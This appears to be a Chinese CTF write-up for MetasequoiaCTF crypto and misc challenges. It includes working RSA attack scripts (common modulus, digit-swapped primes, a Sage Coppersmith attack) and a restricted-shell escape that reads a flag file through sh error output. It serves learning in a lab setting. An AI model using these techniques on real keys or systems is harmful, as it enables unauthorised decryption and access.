c1 = 91305913831214369377952269118161386003598023255485037043787231386393955913536147951327587587463685458285050904908606519471516585546641448049728693190905879280840165324662394536944611092018044651371870986413401191811244830102613672620955502806522821766703471780501595829827875795245077468666876924554483719367619785416487802738542307755841705317059328580966011761532447398826642223971344197882218789319343867872361384139568302372092803096038907172887382345170895273112014635399900800642737687324107565370573604700095505442212165699978970932019423809817487089085601763117309208863650351775335912245447387452956788773428626555630061201067204115092554187354312571068755262098974796820411503610378273433454274777409673603938861625985976632847656111827263952716196589771597261150375688197316301237918777772060246839505840400511836084221123300725351892908105214743311210231911274804713194290807741144717602270672051963664718188579120547722073387555742534912295882639385513725274066607278662476330784799812834843237551921507530373632320031381036550506607567061408192533501338206431901557732808859610231949222985385162467033555818794827557794123641737919050344373856601672258488664080854100467312218803256169436644089734181008742490711580042
c2 = 704672807914934785540657591440512058022586636125385843168732955073514077655455813212009493863389059666899528836516095699125514067099710358014253776587605045075141314272189607334786100207510015707758739101384698920619364876535606210899911129217151741959517344988838631586846350008457359747129948031415545489245577138170245470822851099234206216384013980124363443997339235504467924028046028680088155373925683649047495400986970876581673756506916765485275724626482137125637187439908185652963713581266007823789444165379453792444581101766966160504792503774410227806705414033756780127831024884593928515162191834028847725582871710066858868947182430104633621199015107401148118418338824086178489351697402962464798943542690540041445116576626615679919422505195176433797369659680306125076741925059577683214898660950897895672017286721867404885976418884202714626278569772713938624652451293587114431454520793129201159777144870706434853118587971437409703156441560836614022558588075615856594959231216241788071137142857422791753028932100557615225152094338580103681806055204290166319011784438838989437111665407114828731652938898822052627483844276822323929616602820305955544961236345999748237725866983443344310328933228220159896431099123550617191875040204
n = 762292637561009841867381758891924078920161551681011409810119236902708316218732647411043943763437022249138626076545685661730482641366923692658850431766314218412351837270927506312564544720954923062726662877953440678352431207958623308285911531147439741895411339784197821335423242138644430759797990474398292665026255344351314097831344143699467288732880374170750860467471905921107741006885109935239227868010666908525916679008871504582450836566108323926895929095994914698970059270570182580904903005923375868411609696598681700414843568442218100923302843261091071533416388834137121589901414277494938275241081203545819980264192183417604433935106780970110122975048006585657632026810857827012062220556533199813923599855002754246118206960819774209743569779749774598608808112482297107880631488151767561999274962162175282851451341191623222413183297157111802280844016550160932800325073699005271344653372643829523557629478171849469222857004697685188375657637289718545309995206957844911728971581888022289420352845395758422056507873315923916458799916423955515257867605617687429492984387761566675577947632934213753257825601450323638701033675536654894676100626699720281478967866417903915072119409044838795907066746433347300603690475300736848821164691031
if s1<0:
    s1 = - s1
    c1 = modinv(c1, n)
elif s2<0:
    s2 = - s2
    c2 = modinv(c2, n)
m=(pow(c1,s1,n)*pow(c2,s2,n)) % n
print hex(m)[2:-1]
```

解出字符串后再经rot47解密后即为flag

![rsa_rot47.png](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/crypto/Ridicule/rsa_rot47.png)



## Ridicule_Revenge

- 题目描述：

    > 在你破解了Alice和Bob的通信后，他们决定不再把一条消息发送两次。他们认为，这次你一定束手无策。于是还是为了嘲讽你，他们甚至公开了加密脚本！ 
    > By *scholze*

- [题目附件](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Crypto/RidiculeRevenge/attachment.zip)

- 考察点：RSA攻击

- 难度：中等

- 初始分值：250

- 最终分值：212

- 完成人数：7

>  好像是个原题，能做出来全靠百度。

### 加密

```python
while True:
    p = int(gmpy2.next_prime(random.randint(10**399, 10**400-1)))
    q = int(str(p)[200:]+str(p)[:200])
    if gmpy2.is_prime(q):
        print "not right",p,q
        if check(p*q):
            print p*q
```

p和q的选取比较有意思:

> p是长度400的随机素数，然后将p的前后200位互换位置，如果结果还是素数的话就作为q

### 思路

摘录自[参考链接](https://www.jianshu.com/p/763427ea0e4b)

> 首先我们先把![p](https://math.jianshu.com/math?formula=p)切割成两部分，前200位为![a](https://math.jianshu.com/math?formula=a)，后面的为![b](https://math.jianshu.com/math?formula=b)，则![p=a*10^{200}+b](https://math.jianshu.com/math?formula=p%3Da*10%5E%7B200%7D%2Bb)，此时![q=b*10^{200}+a](https://math.jianshu.com/math?formula=q%3Db*10%5E%7B200%7D%2Ba)。
> 所以![n=p*q=(b*10^{200}+a)*(a*10^{200}+b)=(a*b*10^{400}+(b^2+a^2)*10^{200}+a*b)](https://math.jianshu.com/math?formula=n%3Dp*q%3D(b*10%5E%7B200%7D%2Ba)*(a*10%5E%7B200%7D%2Bb)%3D(a*b*10%5E%7B400%7D%2B(b%5E2%2Ba%5E2)*10%5E%7B200%7D%2Ba*b))不难发现![n](https://math.jianshu.com/math?formula=n)最低200位是![a*b](https://math.jianshu.com/math?formula=a*b)的低200位，![n](https://math.jianshu.com/math?formula=n)最高200位是![a*b](https://math.jianshu.com/math?formula=a*b)的高200位（或者![a^2+b^2](https://math.jianshu.com/math?formula=a%5E2%2Bb%5E2)进一位）而![p](https://math.jianshu.com/math?formula=p)是400位，所以![a,b](https://math.jianshu.com/math?formula=a%2Cb)都为200位，所以![a*b](https://math.jianshu.com/math?formula=a*b)也为400位，所以此时得到就是![a*b](https://math.jianshu.com/math?formula=a*b)。
> 此时我们用![a*b](https://math.jianshu.com/math?formula=a*b)去代入上述等式，求出![(a^2+b^2)*10^{200}](https://math.jianshu.com/math?formula=(a%5E2%2Bb%5E2)*10%5E%7B200%7D)。此时我们可以根据得到的值后200位是否全为0，从而判断![a^2+b^2](https://math.jianshu.com/math?formula=a%5E2%2Bb%5E2)是进了一位的。然后两个变量两个等式算出![a](https://math.jianshu.com/math?formula=a)，![b](https://math.jianshu.com/math?formula=b)。

### 解密

```python
# https://www.jianshu.com/p/763427ea0e4b
import gmpy2
from Crypto.Util.number import *

c = 16396023285324039009558195962852040868243807971027796599580351414803675753933120024077886501736987010658812435904022750269541456641256887079780585729054681025921699044139927086676479128232499416835051090240458236280851063589059069181638802191717911599940897797235038838827322737207584188123709413077535201099325099110746196702421778588988049442604655243604852727791349351291721230577933794627015369213339150586418524473465234375420448340981330049205933291705601563283196409846408465061438001010141891397738066420524119638524908958331406698679544896351376594583883601612086738834989175070317781690217164773657939589691476539613343289431727103692899002758373929815089904574190511978680084831183328681104467553713888762965976896013404518316128288520016934828176674482545660323358594211794461624622116836
n = 21173064304574950843737446409192091844410858354407853391518219828585809575546480463980354529412530785625473800210661276075473243912578032636845746866907991400822100939309254988798139819074875464612813385347487571449985243023886473371811269444618192595245380064162413031254981146354667983890607067651694310528489568882179752700069248266341927980053359911075295668342299406306747805925686573419756406095039162847475158920069325898899318222396609393685237607183668014820188522330005608037386873926432131081161531088656666402464062741934007562757339219055643198715643442608910351994872740343566582808831066736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301
e = 65537
tmp = 10**200
#abhigh,ablow = n/(tmp^3), n % tmp
abhigh,ablow = n/(tmp**3)-1, n % tmp
ab = abhigh*tmp+ablow
# a**2+b**2
a2b2 = (n-ab*(tmp**2)-ab)/tmp
#print a2b2
#(a-b),(a+b)
tmp1 = gmpy2.iroot(a2b2-2*ab,2)[0]
tmp2 = gmpy2.iroot(a2b2+2*ab,2)[0]
a = (tmp1+tmp2)/2
b = a-tmp1
p = a*tmp + b
q = n/p
phi = (p-1)*(q-1)
d = gmpy2.invert(e,phi)
m = pow(c,d,p*q)
print long_to_bytes(m)
```


## Ridicule_Rerevengevenge [unsolved]

- 题目描述：

    > 在你再次成功破解他们的通信之后，Alice和Bob依然没有停止对你的嘲讽——这一次，你甚至可以得到残缺的明文！ 
    > 注：flag为明文的隐藏部分，flag格式为`flag{16进制数}` 
    > By *scholze*
    > hint: Sage

- [题目附件](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Crypto/RidiculeRerevengevenge/attachment.zip)

- 考察点：RSA攻击

- 难度：困难

- 初始分值：400

- 最终分值：368

- 完成人数：5

> 数学...太南了...看官方wp给的[参考链接](https://code.felinae98.cn/ctf/crypto/rsa%E5%A4%A7%E7%A4%BC%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89coppersmith-%E7%9B%B8%E5%85%B3/)竟是我本科社团学弟的文章...唉...自愧不如......

### 直接贴出官方wp

去[这里](https://sagecell.sagemath.org/)，选择`sage`，然后参考[这篇文章](https://code.felinae98.cn/ctf/crypto/rsa大礼包%EF%BC%88二%EF%BC%89coppersmith-相关)

转成十进制后再用如下代码：
```python
n = 0x2519834a6cc3bf25d078caefc5358e41c726a7a56270e425e21515d1b195b248b82f4189a0b621694586bb254e27010ee4376a849bb373e5e3f2eb622e3e7804d18ddb897463f3516b431e7fc65ec41c42edf736d5940c3139d1e374aed1fc3b70737125e1f540b541a9c671f4bf0ded798d727211116eb8b86cdd6a29aefcc7
e = 3
m = randrange(n)
c = pow(m, e, n)
beta = 1
epsilon = beta ^ 2 / 7
nbits = n.nbits()
kbits = floor(nbits * (beta ^ 2 / e - epsilon))
# mbar = m & (2^nbits-2^kbits)
mbar = 0xb11ffc4ce423c77035280f1c575696327901daac8a83c057c453973ee5f4e508455648886441c0f3393fe4c922ef1c3a6249c12d21a000000000000000000
c = 0x1f6f6a8e61f7b5ad8bef738f4376a96724192d8da1e3689dec7ce5d1df615e0910803317f9bafb6671ffe722e0292ce76cca399f2af1952dd31a61b37019da9cf27f82c3ecd4befc03c557efe1a5a29f9bb73c0239f62ed951955718ac0eaa3f60a4c415ef064ea33bbd61abe127c6fc808c0edb034c52c45bd20a219317fb75
#print "upper %d bits (of %d bits) is given" % (nbits - kbits, nbits)
PR.<x> = PolynomialRing(Zmod(n))
f = (mbar + x) ^ e - c
m
x0 = f.small_roots(X=2 ^ kbits, beta=1)[0]  # find root < 2^kbits with factor = n1
mbar + x0
```

解得:
```
0xb11ffc4ce423c77035280f1c575696327901daac8a83c057c453973ee5f4e508455648886441c0f3393fe4c922ef1c3a6249c12d21a4a8c1d4dec4a0e9bf1
```
则对比原来的16进制发现flag为`flag{4a8c1d4dec4a0e9bf1}`。



# Misc

有一到题解出了密文，但是没看出来是base32加密，最后与flag无缘...misc真是太杂了...

## CheckIn

- 题目描述：

    > 欢迎来到MetasequoiaCTF！请扫描二维码完成比赛签到。 
    > By *FLAG挖掘机*

- 考察点：ps

- 难度：入门

- 初始分值：100

- 最终分值：20

- 完成人数：37

给的二维码扫不了

![不是二维码.png](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/checkin/不是二维码.png)

用ps去掉绿色干扰部分，扫码即可

<img src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/checkin/qr-de.png" alt="qrd" style="zoom:38%;" />



## Rabbit Hole

 - 题目描述：

  > 一只奇怪的兔子钻进洞里啦，赶紧把它揪出来。 
  >
  > http://rabbit.yoshino-s.org/ 
  >
  > By *Yoshino-s*

 - 考察点：dig命令、rabbit加密

 - 难度：简单

 - 初始分值：100

 - 最终分值：62

 - 完成人数：9

访问网页，得到提示：

> To catch the rabbit, you should dig deeper and find the txt.

用dig命令查询这个题目url的TXT记录：

```shell
$ dig -t TXT rabbit.yoshino-s.org

; <<>> DiG 9.11.5-P1-1ubuntu2.6-Ubuntu <<>> -t TXT rabbit.yoshino-s.org
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 54090
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;rabbit.yoshino-s.org.		IN	TXT

;; ANSWER SECTION:
rabbit.yoshino-s.org.	300	IN	TXT	"U2FsdGVkX18BkpB/W9lD7ZGSP5BprjbrL/WKn+7fn8gWCXpmDW+y/5FoVYPd5pIFCZfHFiov"

;; Query time: 192 msec
;; SERVER: 127.0.0.53#53(127.0.0.53)
;; WHEN: 四 2月 20 20:30:40 CST 2020
;; MSG SIZE  rcvd: 134

```

在`ANSWER SECTION:`中得到密文，[Rabbit解密](https://www.sojson.com/encrypt_rabbit.html)后即为flag

> flag{0d23348ede942398962778bf49c59776}



## Dont use Mac [unsolved]

- 题目描述：

    > 解答本题时请不要使用Mac。 
    > By *FLAG挖掘机*
    > hint: Plz, check everything you've got.	

- [题目附件](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Misc/Don'tUseMac/attachment.zip)

- 考察点：.DS_Store信息泄漏

- 难度：简单

- 初始分值：200

- 最终分值：170

- 完成人数：6

> 比赛的时候没有解出来，后来看了官方wp，其实就差一点点儿了
>
> 还是自己对各种常见加密不够敏感...wtcl

### 官方wp

解压缩包发现有一个文件夹和一张图片，图片里藏了压缩包，但实际上这里是误区，真正的flag是藏在`__MACOSX`文件夹下，这个文件夹通常是在解压缩的时候会存在，`__MACOSX` 中的`.DS_Store`里存在可疑字符串,通过Base32+ROT13即可得到答案。这里要注意的是，Mac上在解压缩的时候会在建立文件夹的时候覆盖掉`.DS_Store`，这也是题目名字的暗示。

### 复现

查找字符串：

```shell
$ rabin2 -zz ./__MACOSX/.DS_Store 
[Strings]
nth paddr      vaddr      len size section type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000004 0x00000004 4   5            ascii   Bud1
1   0x00000060 0x00000060 4   5            ascii   bwsp
2   0x00000070 0x00000070 32  33           ascii   ON4W45D3OEYGCR27KBSTI4CYL5NHE7I=
3   0x0000020f 0x0000020f 8   17           utf16le \b__MACOS
4   0x00000220 0x00000220 8   9            ascii   bwspblob
5   0x0000022c 0x0000022c 8   9            ascii   bplist00
6   0x0000023b 0x0000023b 59  60           ascii   \a\b\b\n\b\n\r\n]ShowStatusBar[ShowPathbar[ShowToolbar[ShowTabView_
7   0x00000278 0x00000278 51  52           ascii   
8   0x000002ad 0x000002ad 26  27           ascii   {{370, 215}, {770, 436}}\t\b
9   0x000002c8 0x000002c8 12  13           ascii   %1=I`myz{|}~
10  0x000002f8 0x000002f8 8   17           utf16le \b__MACOS
11  0x00000309 0x00000309 8   9            ascii   lg1Scomp
12  0x0000031c 0x0000031c 8   17           utf16le \b__MACOS
13  0x0000032d 0x0000032d 8   9            ascii   moDDblob
14  0x00000348 0x00000348 6   13           utf16le _MACOS
15  0x00000355 0x00000355 8   9            ascii   modDblob
16  0x00000370 0x00000370 6   13           utf16le _MACOS
17  0x0000037d 0x0000037d 8   9            ascii   ph1Scomp
18  0x00000390 0x00000390 8   17           utf16le \b__MACOS
19  0x000003a1 0x000003a1 8   9            ascii   vSrnlong
20  0x00001411 0x00001411 4   5            ascii   DSDB

```

得到字符串：

> ON4W45D3OEYGCR27KBSTI4CYL5NHE7I=

解密：

![mac.png](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/Dont%20Use%20Mac/mac.png)



## rm -rf /

- 题目描述：

    > 出题人不会出题，只好把系统命令删了让大家来猜flag。 
    > 注：请使用`nc`连接容器，浏览器访问是无效的。 
    > By *FLAG挖掘机* 					

- 考察点：linux命令、shell编程

- 难度：简单

- 初始分值：250

- 最终分值：244

- 完成人数：3

### 非预期

`nc`连过去，有一次执行命令的机会，直接执行sh即可拿到shell

看了下`/bin`目录下的文件，删除了有输出功能的`cat`、`grep`等命令，不过`sh`还在，只要` sh .flag`，就能从`stderr`中读到flag

> sh 会逐条执行文本中的命令，命令不存在时会报错 e.g.
>
> ```shell
> $ sh txt 
> txt: 1: txt: xxxx: not found
> ```

### 官方解

出题人背锅的一道题，存在很多非预期解。

预期解法是

```shell
while read -r line;do echo $line;done</.flag
```

但实际做下来发现，因为没有对输入进行限制，`sed`等命令就可以读到flag。删去的命令基本上是`cat, grep, head,more, tail, less, base64`等，其实还删去了`/usr/bin/`下的内容。



# end

出题师傅们十分用心，[官方wp](https://github.com/SignorMercurio/MetasequoiaCTF)讲解的超级详细，体验很好的一次CTF比赛~